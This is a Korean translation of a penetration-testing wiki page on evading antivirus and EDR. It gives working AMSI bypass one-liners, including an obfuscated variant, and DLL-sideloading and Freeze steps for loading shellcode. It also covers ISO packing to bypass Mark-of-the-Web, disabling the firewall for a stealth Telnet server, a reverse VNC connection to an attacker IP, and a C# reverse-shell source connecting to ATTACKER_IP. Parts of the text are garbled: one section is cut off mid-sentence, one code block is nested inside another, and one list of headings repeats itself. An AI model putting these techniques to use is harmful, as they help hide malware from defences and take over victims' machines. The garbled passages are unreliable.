# 안티바이러스 (AV) 우회

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

**이 페이지는** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**에 의해 작성되었습니다!**

## **AV 회피 방법론**

현재 AV는 파일이 악성인지 여부를 확인하기 위해 정적 탐지, 동적 분석 및 고급 EDR의 경우 행위 분석과 같은 다양한 방법을 사용합니다.

### **정적 탐지**

정적 탐지는 이진 파일이나 스크립트에서 알려진 악성 문자열이나 바이트 배열을 플래그로 지정하고 파일 자체에서 정보를 추출함으로써 달성됩니다(예: 파일 설명, 회사 이름, 디지털 서명, 아이콘, 체크섬 등). 이는 알려진 공개 도구를 사용하면 쉽게 감지될 수 있으므로 회피하는 몇 가지 방법이 있습니다:

* **암호화**

이진 파일을 암호화하면 AV가 프로그램을 감지할 수 없지만, 프로그램을 메모리에 복호화하고 실행하기 위해 어떤 종류의 로더가 필요합니다.

* **난독화**

AV를 통과시키기 위해 이진 파일이나 스크립트의 일부 문자열을 변경하는 것만으로 충분할 수 있지만, 난독화할 내용에 따라 시간이 많이 소요될 수 있습니다.

* **사용자 정의 도구**

자체 도구를 개발하면 알려진 악성 서명이 없으므로 시간과 노력이 많이 필요합니다.

{% hint style="info" %}
Windows Defender 정적 탐지에 대한 좋은 방법은 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)입니다. 이 도구는 파일을 여러 세그먼트로 분할한 다음 Defender에게 각각 스캔하도록 지시하여 이진 파일에서 플래그 지정된 문자열이나 바이트를 정확히 알려줄 수 있습니다.
{% endhint %}

실용적인 AV 회피에 대한 [YouTube 재생목록](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf)을 꼭 확인하는 것을 강력히 추천합니다.

### **동적 분석**

동적 분석은 AV가 이진 파일을 샌드박스에서 실행하고 악성 활동을 감시하는 것입니다(예: 브라우저의 비밀번호를 해독하고 읽으려는 시도, LSASS에 대한 미니덤프 수행 등). 이 부분은 조금 더 복잡할 수 있지만, 샌드박스를 회피하기 위해 할 수 있는 몇 가지 방법이 있습니다.

* **실행 전에 대기** 구현 방식에 따라 AV의 동적 분석을 우회하는 좋은 방법일 수 있습니다. AV는 사용자의 작업 흐름을 방해하지 않기 위해 파일을 스캔하는 시간이 매우 짧기 때문에 긴 대기 시간을 사용하면 이진 파일의 분석이 방해될 수 있습니다. 문제는 많은 AV 샌드박스가 구현 방식에 따라 대기 시간을 건너뛸 수 있다는 것입니다.
* **기기의 리소스 확인** 일반적으로 샌드박스는 작업에 사용할 리소스가 매우 적습니다(예: < 2GB RAM). 그렇지 않으면 사용자의 기기가 느려질 수 있습니다. 여기서 매우 창의적일 수 있습니다. 예를 들어 CPU 온도나 팬 속도를 확인함으로써 CPU의 온도를 확인할 수 있습니다. 모든 것이 샌드박스에 구현되는 것은 아닙니다.
* **기기별 확인** "contoso.local" 도메인에 가입된 사용자를 대상으로 하려면 컴퓨터의 도메인을 확인하여 지정한 도메인과 일치하는지 확인할 수 있습니다. 일치하지 않으면 프로그램을 종료할 수 있습니다.

Microsoft Defender의 샌드박스 컴퓨터 이름은 HAL9TH입니다. 따라서 악성 코드를 폭발하기 전에 악성 코드에서 컴퓨터 이름을 확인하면 이름이 HAL9TH와 일치하면 Defender의 샌드박스 내부에 있으므로 프로그램을 종료할 수 있습니다.

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>출처: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

[@mgeeky](https://twitter.com/mariuszbit)의 몇 가지 다른 좋은 팁

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev 채널</p></figcaption></figure>

이 글에서 이전에 언급한 대로 **공개 도구**는 결국 **감지**될 것입니다. 그러므로 다음과 같은 질문을 해야 합니다:

예를 들어, LSASS를 덤프하려면 **정말로 mimikatz를 사용해야** 할까요? 아니면 더 알려진 것보다는 덜 알려진 다른 프로젝트를 사용하여 LSASS를 덤프할 수 있을까요?

올바른 답은 아마도 후자일 것입니다. 예를 들어 mimikatz를 사용하는 경우, AV 및 EDR에서 가장 많이 플래그 지정된 악성 코드 중 하나일 가능성이 높습니다. 프로젝트 자체는 매우 멋지지만 AV를 우회하기 위해 작업하는 것은 악몽입니다. 따라서 달성하려는 목표에 대한 대안을 찾아보세요.

{% hint style="info" %}
회피를 위해 페이로드를 수정할 때, Defender에서 **자동 샘플 제출을 꺼두고**, 심각하게, **VIRUSTOTAL에 업로드하지 마세요**. 장기적으로 회피를 달성하려면 특정 AV에서 페이로드가 감지되는지 확인하려면 VM에 설치하고 자동 샘플 제출을 꺼
## DLL Sideloading & Proxying

**DLL Sideloading**은 로더가 사용하는 DLL 검색 순서를 이용하여 피해 응용 프로그램과 악성 페이로드를 함께 배치함으로써 이점을 얻습니다.

[Siofra](https://github.com/Cybereason/siofra)와 다음 PowerShell 스크립트를 사용하여 DLL Sideloading에 취약한 프로그램을 확인할 수 있습니다:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

이 명령은 "C:\Program Files\\" 내에서 DLL 하이재킹에 취약한 프로그램 목록과 그들이 로드하려는 DLL 파일을 출력합니다.

나는 **DLL 하이재킹 가능/사이드로드 가능한 프로그램을 직접 탐색하는 것을 강력히 권장**합니다. 이 기술은 제대로 수행되면 매우 은밀하지만, 공개적으로 알려진 DLL 사이드로드 가능한 프로그램을 사용하면 쉽게 감지될 수 있습니다.

악성 DLL을 프로그램이 로드하기를 기대하는 이름으로 배치하는 것만으로는 페이로드가 로드되지 않습니다. 프로그램은 해당 DLL 내에 특정 함수를 기대하기 때문에 이 문제를 해결하기 위해 **DLL 프록시/포워딩**이라는 다른 기술을 사용할 것입니다.

**DLL 프록시**는 프록시(악성) DLL에서 프로그램이 수행하는 호출을 원본 DLL로 전달하여 프로그램의 기능을 보존하고 페이로드의 실행을 처리할 수 있게 합니다.

나는 [@flangvik](https://twitter.com/Flangvik/)의 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 프로젝트를 사용할 것입니다.

다음은 내가 따랐던 단계입니다:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

마지막 명령은 2개의 파일을 제공합니다: DLL 소스 코드 템플릿과 원본으로 이름이 변경된 DLL입니다.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

다음은 결과입니다:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

우리의 쉘코드([SGN](https://github.com/EgeBalci/sgn)로 인코딩됨)와 프록시 DLL은 [antiscan.me](https://antiscan.me)에서 0/26 탐지율을 가지고 있습니다! 이걸 성공이라고 할 수 있겠네요.

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
DLL Sideloading에 대해 더 자세히 알아보기 위해 [S3cur3Th1sSh1t의 twitch VOD](https://www.twitch.tv/videos/1644171543)와 [ippsec의 비디오](https://www.youtube.com/watch?v=3eROsG\_WNpE)를 **강력히 추천**합니다.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze는 중단된 프로세스, 직접 시스콜 및 대체 실행 방법을 사용하여 EDR을 우회하는 페이로드 툴킷입니다.`

Freeze를 사용하여 쉘코드를 은밀하게 로드하고 실행할 수 있습니다.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
회피는 고양이와 쥐의 게임에 불과합니다. 오늘 작동하는 것이 내일은 감지될 수 있으므로, 가능하다면 여러 회피 기술을 연결하여 의존하지 마십시오.
{% endhint %}

## AMSI (안티-악성코드 스캔 인터페이스)

AMSI는 "[무파일 악성코드](https://en.wikipedia.org/wiki/Fileless\_malware)"를 방지하기 위해 만들어졌습니다. 초기에 AV는 **디스크의 파일**만 스캔할 수 있었기 때문에, 페이로드를 **직접 메모리에서 실행**할 수 있다면 AV는 충분한 가시성이 없어서 방지할 수 없었습니다.

AMSI 기능은 Windows의 다음 구성 요소에 통합되어 있습니다.

* 사용자 계정 컨트롤 또는 UAC (EXE, COM, MSI 또는 ActiveX 설치의 권한 상승)
* PowerShell (스크립트, 대화형 사용 및 동적 코드 평가)
* Windows 스크립트 호스트 (wscript.exe 및 cscript.exe)
* JavaScript 및 VBScript
* Office VBA 매크로

AMSI는 악성코드 방지 솔루션에서 스크립트 동작을 검사하기 위해 암호화되지 않고 난독화되지 않은 형식으로 스크립트 내용을 노출시킵니다.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`을 실행하면 Windows Defender에서 다음 경고가 표시됩니다.

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

주목해야 할 점은 `amsi:`를 접두사로 사용하고 스크립트가 실행된 실행 파일의 경로를 추가한 것입니다. 이 경우 powershell.exe입니다.

디스크에 파일을 저장하지 않았지만, AMSI 때문에 메모리에서 감지되었습니다.

AMSI를 우회하는 몇 가지 방법이 있습니다.

* **난독화**

AMSI는 주로 정적 탐지와 함께 작동하기 때문에 로드하려는 스크립트를 수정하는 것은 탐지 회피에 좋은 방법일 수 있습니다.

그러나 AMSI는 여러 계층을 가진 스크립트의 난독화도 해독할 수 있으므로, 난독화는 수행 방식에 따라 좋지 않을 수 있습니다. 이로 인해 회피가 그다지 간단하지 않습니다. 하지만 때로는 몇 개의 변수 이름을 변경하기만 하면 될 수도 있으므로, 어떤 것이 얼마나 플래그되었는지에 따라 다릅니다.

* **AMSI 우회**

AMSI는 powershell (또한 cscript.exe, wscript.exe 등) 프로세스에 DLL을 로드하여 구현되기 때문에, 권한이 없는 사용자로서도 쉽게 조작할 수 있습니다. AMSI 구현의 이러한 결함으로 인해 연구원들은 AMSI 스캔을 회피하는 여러 가지 방법을 발견했습니다.

**오류 강제**

AMSI 초기화를 실패하도록 강제하면(amsiInitFailed), 현재 프로세스에 대한 스캔이 시작되지 않습니다. 이는 원래 [Matt Graeber](https://twitter.com/mattifestation)에 의해 공개되었으며, Microsoft는 더 널리 사용되는 것을 방지하기 위해 시그니처를 개발했습니다.

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

현재 powershell 프로세스에서 AMSI를 사용할 수 없게 만드는 데에는 단 한 줄의 powershell 코드만 필요했습니다. 물론 이 줄은 AMSI 자체에 의해 감지되므로 이 기술을 사용하기 위해서는 일부 수정이 필요합니다.

여기에는 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)에서 가져온 수정된 AMSI 우회 방법이 있습니다.
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**메모리 패칭**

이 기술은 [@RastaMouse](https://twitter.com/\_RastaMouse/)에 의해 처음으로 발견되었으며, 사용자가 제공한 입력을 스캔하는 역할을 하는 amsi.dll의 "AmsiScanBuffer" 함수의 주소를 찾아내고, 실제 스캔 결과가 깨끗한 결과로 해석되는 0을 반환하는 명령으로 덮어씌우는 것입니다.

{% hint style="info" %}
더 자세한 설명은 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)를 참조하십시오.
{% endhint %}

파워셸을 사용하여 AMSI를 우회하기 위해 사용되는 다른 여러 기술도 있습니다. [**이 페이지**](basic-powershell-for-pentesters/#amsi-bypass)와 [이 저장소](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)를 확인하여 더 자세히 알아보세요.

또는 이 스크립트는 메모리 패칭을 통해 각 새로운 파워셸을 패치할 것입니다.

## 난독화

C# 평문 코드를 난독화하거나 이진 파일을 컴파일하기 위한 **메타프로그래밍 템플릿**을 생성하거나 **컴파일된 이진 파일을 난독화**하는 데 사용할 수 있는 여러 도구가 있습니다. 이러한 도구는 다음과 같습니다:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# 난독화 도구**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 이 프로젝트의 목표는 [LLVM](http://www.llvm.org/) 컴파일 스위트의 오픈 소스 포크를 제공하여 [코드 난독화](http://en.wikipedia.org/wiki/Obfuscation\_\(software\))와 조작 방지를 통해 소프트웨어 보안을 향상시키는 것입니다.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator는 외부 도구를 사용하지 않고 컴파일러를 수정하지 않고도 `C++11/14` 언어를 사용하여 컴파일 시간에 난독화된 코드를 생성하는 방법을 보여줍니다.
* [**obfy**](https://github.com/fritzone/obfy): C++ 템플릿 메타프로그래밍 프레임워크에서 생성된 난독화된 작업 레이어를 추가하여 응용 프로그램을 크랙하려는 사람의 작업을 조금 어렵게 만듭니다.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz는 .exe, .dll, .sys 등 다양한 pe 파일을 난독화할 수 있는 x64 이진 파일 난독화 도구입니다.
* [**metame**](https://github.com/a0rtega/metame): Metame은 임의의 실행 파일을 위한 간단한 변형 코드 엔진입니다.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator는 ROP (return-oriented programming)을 사용하여 LLVM이 지원하는 언어에 대한 세밀한 코드 난독화 프레임워크입니다. ROPfuscator는 일반적인 제어 흐름의 개념을 방해하기 위해 일반적인 명령을 ROP 체인으로 변환하여 어셈블리 코드 수준에서 프로그램을 난독화합니다.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt는 Nim으로 작성된 .NET PE 암호화 도구입니다.
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor는 기존의 EXE/DLL을 쉘코드로 변환한 다음 로드할 수 있습니다.

## SmartScreen 및 MoTW

인터넷에서 일부 실행 파일을 다운로드하고 실행할 때 이 화면을 본 적이 있을 것입니다.

Microsoft Defender SmartScreen은 잠재적으로 악성적인 응용 프로그램을 실행하는 것으로부터 최종 사용자를 보호하기 위한 보안 메커니즘입니다.

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

SmartScreen은 주로 평판 기반 접근 방식으로 작동하며, 일반적으로 다운로드되지 않는 응용 프로그램은 SmartScreen을 트리거하여 최종 사용자에게 파일 실행을 경고하고 방지합니다 (그러나 파일은 "자세히 알아보기" -> "그래도 실행"을 클릭하여 실행할 수 있습니다).

**MoTW** (Mark of The Web)는 인터넷에서 파일을 다운로드할 때 자동으로 생성되는 Zone.Identifier라는 [NTFS 대체 데이터 스트림](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\))입니다. 이 데이터 스트림에는 파일이 다운로드된 URL과 함께 생성됩니다.

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>인터넷에서 다운로드한 파일의 Zone.Identifier ADS를 확인합니다.</p></figcaption></figure>

{% hint style="info" %}
**신뢰할 수 있는** 서명 인증서로 서명된 실행 파일은 **SmartScreen을 트리거하지 않습니다**.
{% endhint %}

Mark of The Web를 피하기 위한 매우 효과적인 방법은 ISO와 같은 컨테이너에 페이로드를 포장하는 것입니다. 이는 Mark-of-the-Web (MOTW)가 **NTFS가 아닌** 볼륨에는 적용할 수 없기 때문입니다.

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)는 Mark-of-the-Web를 피하기 위해 페이로드를 출력 컨테이너에 패키징하는 도구입니다.

사용 예시:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
다음은 [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)를 사용하여 ISO 파일 내에 페이로드를 포장하여 SmartScreen을 우회하는 데모입니다.

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C# 어셈블리 리플렉션

C# 이진 파일을 메모리에 로드하는 방법은 오랫동안 알려져 있으며 여전히 AV에 감지되지 않고 후기 침투 도구를 실행하는 훌륭한 방법입니다.

페이로드가 디스크에 접촉하지 않고 직접 메모리에 로드되기 때문에 전체 프로세스에 대한 AMSI 패치에 대해 걱정할 필요가 없습니다.

대부분의 C2 프레임워크 (sliver, Covenant, metasploit, CobaltStrike, Havoc 등)는 이미 메모리에서 C# 어셈블리를 직접 실행할 수 있는 기능을 제공하지만, 다음과 같은 다양한 방법이 있습니다:

* **Fork\&Run**

이 방법은 **새로운 희생 프로세스를 생성**하여 후기 침투 악성 코드를 해당 새 프로세스에 주입하고 악성 코드를 실행한 다음 새 프로세스를 종료하는 것을 포함합니다. 이 방법의 장점은 포크 및 실행 방법에서 실행이 **우리의 Beacon 임플란트 프로세스 외부에서** 발생한다는 것입니다. 이는 후기 침투 작업 중에 무언가 잘못되거나 감지되는 경우 **임플란트가 생존할 가능성이 훨씬 높다는 것**을 의미합니다. 단점은 **행동 감지**에 의해 **감지될 가능성이 훨씬 높다는 것**입니다.

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

이 방법은 후기 침투 악성 코드를 **자체 프로세스에 주입**하는 것입니다. 이렇게하면 새로운 프로세스를 생성하고 AV에 스캔되는 것을 피할 수 있지만, 페이로드의 실행 중에 문제가 발생하면 **Beacon을 잃을 가능성이 훨씬 높아집니다**.

<figure><img src="../.gitbook/assets/image (9) (3) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
C# 어셈블리 로딩에 대해 더 읽고 싶다면 다음 기사를 확인하십시오. [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 및 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

또한 PowerShell에서 C# 어셈블리를 로드할 수도 있습니다. [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) 및 [S3cur3th1sSh1t의 비디오](https://www.youtube.com/watch?v=oe11Q-3Akuk)를 확인하세요.

## 다른 프로그래밍 언어 사용

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)에서 제안한대로, 공격자가 제어하는 SMB 공유에 설치된 인터프리터 환경에 대한 접근 권한을 제공하여 다른 언어를 사용하여 악성 코드를 실행할 수 있습니다.&#x20;

SMB 공유의 인터프리터 이진 파일과 환경에 대한 액세스를 허용하면, 감염된 기기의 메모리 내에서 이러한 언어로 임의의 코드를 실행할 수 있습니다.

이 저장소는 다음과 같이 설명합니다. Defender는 여전히 스크립트를 스캔하지만 Go, Java, PHP 등을 활용하여 정적 시그니처를 우회할 수 있는 **더 많은 유연성**이 있습니다. 이러한 언어로 무작위로 난독화되지 않은 역쉘 스크립트를 테스트한 결과 성공적이었습니다.

## 고급 회피

회피는 매우 복잡한 주제이며 때로는 하나의 시스템에서 많은 다른 텔레메트리 소스를 고려해야하기 때문에 성숙한 환경에서 완전히 감지되지 않는 것은 거의 불가능합니다.

대상이 되는 모든 환경에는 각각의 강점과 약점이 있습니다.

[@ATTL4S](https://twitter.com/DaniLJ94)의 이 발표를 보는 것을 강력히 권장합니다. 이를 통해 고급 회피 기술에 대한 입문을 할 수 있습니다.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

[@mariuszbit](https://twitter.com/mariuszbit)의 이 발표도 회피에 대해 좋은 자료입니다.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **이전 기술**

### **Defender가 악성으로 인식하는 부분 확인**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)를 사용하여 **바이너리의 일부를 제거**하여 Defender가 악성으로 인식하는 부분을 **찾아내고 분할**할 수 있습니다.\
동일한 작업을 수행하는 다른 도구로는 [**avred**](https://github.com/dobin/avred)가 있으며 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)에서 서비스를 제공합니다.

### **Telnet 서버**

Windows10 이전의 모든 Windows에는 설치할 수 있는 **Telnet 서버**가 있었습니다. (관리자로) 다음을 수행하여 설치할 수 있습니다.
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
시스템이 시작될 때 **시작**하고 지금 **실행**하십시오:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**텔넷 포트 변경** (스텔스) 및 방화벽 비활성화:

```plaintext
1. 먼저, 텔넷 포트를 변경하여 스텔스하게 만듭니다. 기본 포트인 23번 대신 다른 포트를 선택합니다.

2. 방화벽을 비활성화합니다. 방화벽은 시스템 보안을 강화하는 중요한 요소이지만, 텔넷 접속을 위해 임시로 비활성화할 수 있습니다.

   - Windows 방화벽을 비활성화하려면 다음 명령을 실행합니다:
     ```
     netsh advfirewall set allprofiles state off
     ```

   - 다른 방화벽 솔루션을 사용하는 경우 해당 솔루션의 문서를 참조하여 방화벽을 비활성화합니다.
```
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

다음에서 다운로드하세요: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (설치가 아닌 바이너리 다운로드를 원합니다)

**호스트에서**: _**winvnc.exe**_를 실행하고 서버를 구성하세요:

* _TrayIcon 비활성화_ 옵션을 활성화하세요.
* _VNC 비밀번호_에 비밀번호를 설정하세요.
* _View-Only 비밀번호_에 비밀번호를 설정하세요.

그런 다음, 바이너리 _**winvnc.exe**_와 **새로 생성된** _**UltraVNC.ini**_ 파일을 **피해자** 내부로 이동하세요.

#### **역방향 연결**

**공격자**는 **호스트** 내에서 `vncviewer.exe -listen 5900` 바이너리를 실행하여 역방향 **VNC 연결**을 수신할 준비를 해야 합니다. 그런 다음, **피해자** 내에서 다음을 실행하세요: winvnc 데몬 시작 `winvnc.exe -run` 및 `winwnc.exe [-autoreconnect] -connect <공격자_ip>::5900` 실행

**경고:** 은신성을 유지하기 위해 몇 가지 작업을 수행하지 마세요.

* 이미 실행 중인 경우 `winvnc`를 시작하지 마세요. 그렇지 않으면 [팝업](https://i.imgur.com/1SROTTl.png)이 트리거됩니다. `tasklist | findstr winvnc`로 실행 여부를 확인하세요.
* 동일한 디렉토리에 `UltraVNC.ini`가 없는 경우 `winvnc`를 시작하지 마세요. 그렇지 않으면 [구성 창](https://i.imgur.com/rfMQWcf.png)이 열립니다.
* 도움말을 위해 `winvnc -h`를 실행하지 마세요. 그렇지 않으면 [팝업](https://i.imgur.com/oc18wcu.png)이 트리거됩니다.

### GreatSCT

다음에서 다운로드하세요: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT 내부:

## AV Bypass

### AV Bypass Techniques

#### 1. Encoding

인코딩

#### 2. Encryption

암호화

#### 3. Obfuscation

난독화

#### 4. Polymorphism

다형성

#### 5. Metasploit Framework

Metasploit 프레임워크

#### 6. Veil Framework

Veil 프레임워크

#### 7. Shellter

Shellter

#### 8. Unicorn

Unicorn

#### 9. Phantom-Evasion

Phantom-Evasion

#### 10. Covenant

Covenant

### AV Bypass Tools

#### 1. Veil Framework

Veil 프레임워크

#### 2. Shellter

Shellter

#### 3. Unicorn

Unicorn

#### 4. Phantom-Evasion

Phantom-Evasion

#### 5. Covenant

Covenant

### AV Bypass Techniques in PowerShell

#### 1. Encoding

인코딩

#### 2. Encryption

암호화

#### 3. Obfuscation

난독화

#### 4. Polymorphism

다형성

#### 5. Metasploit Framework

Metasploit 프레임워크

#### 6. Veil Framework

Veil 프레임워크

#### 7. Shellter

Shellter

#### 8. Unicorn

Unicorn

#### 9. Phantom-Evasion

Phantom-Evasion

#### 10. Covenant

Covenant
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
이제 `msfconsole -r file.rc`로 **리스너를 시작**하고 다음과 같이 **XML 페이로드를 실행**합니다:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**현재의 방어 시스템은 프로세스를 매우 빠르게 종료합니다.**

### 우리만의 리버스 쉘 컴파일하기

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 첫 번째 C# 리버스 쉘

다음과 같이 컴파일하세요:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
사용 방법:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

